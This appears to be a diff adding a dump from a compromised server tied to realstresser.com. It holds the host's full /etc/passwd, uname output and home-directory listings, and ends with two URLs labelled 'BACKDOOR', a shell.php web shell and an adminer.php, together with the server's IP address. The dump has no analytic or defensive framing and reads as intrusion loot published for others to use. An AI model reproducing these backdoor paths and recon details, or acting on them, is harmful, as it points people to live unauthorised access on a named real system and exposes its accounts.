@@ -1,0 +1,146 @@
+https://realstresser.com/
+
+/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+ugurlu:x:1000:1000:ugurlu:/home/ugurlu:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+psaadm:x:999:1001:psa user:/opt/psa/admin:/bin/false
+sw-cp-server:x:998:999:sw-cp-server user:/var/lib/sw-cp-server:/bin/false
+postfix:x:112:114::/var/spool/postfix:/usr/sbin/nologin
+popuser:x:30:31:POP3 service user:/var/qmail/popuser:/bin/false
+mhandlers-user:x:31:31:mail handlers user:/:/bin/false
+dovecot:x:997:1005:Dovecot IMAP server user:/usr/lib/dovecot:/bin/false
+dovenull:x:996:1006:Dovecot login user:/:/bin/false
+roundcube_sysuser:x:995:1007:roundcube webmail user:/usr/share/psa-roundcube:/bin/false
+nginx:x:994:996:Nginx user:/var/lib/nginx:/bin/false
+bind:x:113:117::/var/cache/bind:/usr/sbin/nologin
+psaftp:x:993:1008:anonftp psa user:/:/bin/false
+grafana:x:114:118::/usr/share/grafana:/bin/false
+awersome:x:10000:1004::/var/www/vhosts/awersomecheats.org:/bin/false
+realstresser:x:10001:1004::/var/www/vhosts/realstresser.com:/bin/false
+realui:x:10002:1004::/var/www/vhosts/realui.org:/bin/false
+rcprotection:x:10003:1004::/var/www/vhosts/rcprotection.cf:/bin/false
+xrdp:x:115:119::/var/run/xrdp:/usr/sbin/nologin
+rtkit:x:116:120:RealtimeKit,,,:/proc:/usr/sbin/nologin
+usbmux:x:117:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+pulse:x:118:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+xr4zz3rs:x:1001:1009:,,,:/home/xr4zz3rs:/bin/bash
+avahi:x:119:124:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+geoclue:x:120:125::/var/lib/geoclue:/usr/sbin/nologin
+x2gouser:x:121:126::/var/lib/x2go:/bin/false
+x2goprint:x:122:127::/var/spool/x2goprint:/bin/sh
+vitellius:x:10004:1004::/var/www/vhosts/vitellius.cf:/bin/false
+habercin:x:10005:1004::/var/www/vhosts/habercin.org:/bin/false
+imunify360-webshield:x:992:995:imunify360-webshield user:/var/cache/imunify360-webshield:/usr/sbin/nologin
+_imunify:x:991:991::/home/_imunify:/bin/sh
+ossec:x:990:994::/var/ossec:/sbin/nologin
+ossecr:x:989:994::/var/ossec:/sbin/nologin
+ossecm:x:988:994::/var/ossec:/sbin/nologin
+ossece:x:987:994::/var/ossec:/sbin/nologin
+sananeyarram:x:10006:1004::/var/www/vhosts/sananeyarram.cf:/bin/false
+rcsmtp:x:10007:1004::/var/www/vhosts/realitycheats.com:/bin/false
+debian-tor:x:123:128::/var/lib/tor:/bin/false
+debian-spamd:x:124:129::/var/lib/spamassassin:/bin/sh
+amavis:x:125:130:AMaViS system user,,,:/var/lib/amavis:/bin/sh
+csf:x:10008:10008::/home/csf:/bin/false
+zulaaltincim:x:10009:1004::/var/www/vhosts/zulaaltincim.com:/bin/false
+cdnmaster:x:10010:1004::/var/www/vhosts/cdnmaster.org:/bin/false
+zodforum:x:10011:1004::/var/www/vhosts/zodforum.com:/bin/false
+
+uname -a
+Linux realprotection.network 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+/home/csf/:
+total 8.0K
+drwxr-xr-x 2 csf  csf  4.0K Oct 30 04:12 .
+drwxr-xr-x 5 root root 4.0K Oct 30 04:12 ..
+
+/home/ugurlu/:
+total 32K
+drwxr-xr-x 4 ugurlu ugurlu 4.0K Sep  3 00:32 .
+drwxr-xr-x 5 root   root   4.0K Oct 30 04:12 ..
+-rw------- 1 ugurlu ugurlu  111 Sep  3 00:32 .bash_history
+-rw-r--r-- 1 ugurlu ugurlu  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 ugurlu ugurlu 3.7K Apr  4  2018 .bashrc
+drwx------ 2 ugurlu ugurlu 4.0K Sep  3 00:30 .cache
+drwx------ 3 ugurlu ugurlu 4.0K Sep  3 00:30 .gnupg
+-rw-r--r-- 1 ugurlu ugurlu  807 Apr  4  2018 .profile
+-rw-r--r-- 1 ugurlu ugurlu    0 Sep  3 00:30 .sudo_as_admin_successful
+
+/home/xr4zz3rs/:
+total 296K
+drwxr-xr-x 21 xr4zz3rs xr4zz3rs 4.0K Dec  7 10:31 .
+drwxr-xr-x  5 root     root     4.0K Oct 30 04:12 ..
+-rw-------  1 xr4zz3rs xr4zz3rs 1.7K Dec  6 21:57 .ICEauthority
+-rw-------  1 xr4zz3rs xr4zz3rs  520 Dec  6 21:57 .Xauthority
+-rw-------  1 xr4zz3rs xr4zz3rs 1.7K Dec 22 21:51 .bash_history
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  220 Sep  4 21:08 .bash_logout
+-rw-r--r--  1 xr4zz3rs xr4zz3rs 3.7K Sep  4 21:08 .bashrc
+drwxrwxr-x  8 xr4zz3rs xr4zz3rs 4.0K Sep  4 22:58 .cache
+drwxrwxr-x 11 xr4zz3rs xr4zz3rs 4.0K Dec  6 22:09 .config
+drwx------  3 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 .gnupg
+drwx------  3 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 .local
+drwx------  5 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:53 .mozilla
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  807 Sep  4 21:08 .profile
+drwx------  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 22:19 .ssh
+-rw-r--r--  1 xr4zz3rs xr4zz3rs    0 Sep  4 21:19 .sudo_as_admin_successful
+drwxrwxr-x  3 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:50 .thumbnails
+-rw-------  1 xr4zz3rs xr4zz3rs  709 Sep  4 22:26 .viminfo
+drwx------  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 22:06 .vnc
+-rw-rw-r--  1 xr4zz3rs xr4zz3rs  170 Sep  4 22:29 .wget-hsts
+drwxrwxr-x  3 xr4zz3rs xr4zz3rs 4.0K Dec  6 21:57 .x2go
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  13K Sep  5 14:33 .xorgxrdp.10.log
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  14K Sep  5 14:32 .xorgxrdp.10.log.old
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  17K Sep  5 18:02 .xorgxrdp.11.log
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  16K Sep  4 21:35 .xorgxrdp.11.log.old
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  13K Sep  4 22:10 .xorgxrdp.12.log
+-rw-r--r--  1 xr4zz3rs xr4zz3rs  13K Sep  4 22:06 .xorgxrdp.12.log.old
+-rw-------  1 xr4zz3rs xr4zz3rs  36K Sep  5 18:02 .xsession-errors
+-rw-------  1 xr4zz3rs xr4zz3rs  14K Sep  5 18:02 .xsession-x2go-optimistic-rubin.185-250-242-58.plesk.page-errors
+-rw-------  1 xr4zz3rs xr4zz3rs 8.9K Dec 22 21:51 .xsession-x2go-realprotection.network-errors
+-rw-------  1 xr4zz3rs xr4zz3rs 8.3K Oct 14 04:26 .xsession-x2go-realprotection.network-errors.old
+drwxr-xr-x  3 xr4zz3rs xr4zz3rs 4.0K Dec  6 21:59 Desktop
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Documents
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Downloads
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Music
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Pictures
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Public
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Templates
+drwxr-xr-x  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 Videos
+drwxrwxr-x  4 xr4zz3rs xr4zz3rs 4.0K Sep  4 22:58 go
+drwxrwxr-t  2 xr4zz3rs xr4zz3rs 4.0K Sep  4 21:08 thinclient_drives
+
+
+BACKDOOR : https://realstresser.com/ajax/shell.php
+BACKDOOR : https://realstresser.com/ajax/adminer.php
+
+VPS ip : 185.250.242.58
